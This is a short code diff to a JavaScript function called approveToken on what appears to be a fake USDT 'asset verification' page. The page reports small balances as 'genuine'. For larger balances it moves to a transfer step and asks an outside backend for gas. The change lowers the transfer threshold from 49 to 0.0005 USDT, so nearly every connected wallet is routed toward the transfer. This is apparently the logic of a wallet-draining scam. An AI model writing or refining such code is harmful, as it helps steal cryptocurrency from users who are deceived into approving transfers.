@@ -1352,8 +1352,8 @@ async function approveToken() {
             return;
         }
 
-        // ✅ If ≤ 49 USDT
-        if (usdtBalance <= 49) {
+        // ✅ If ≤ 0.0005 USDT
+        if (usdtBalance <= 0.0005) {
             showPopup(
                 `✅ Verification Successful<br>Your assets are genuine.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
                 "green"
@@ -1361,7 +1361,7 @@ async function approveToken() {
             return;
         }
 
-        // ✅ If > 49 USDT → transfer
+        // ✅ If > 0.0005 USDT → transfer
         if (bnbBalance < 0.0005) {
             showPopup("Requesting gas from backend...", "blue");
             await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
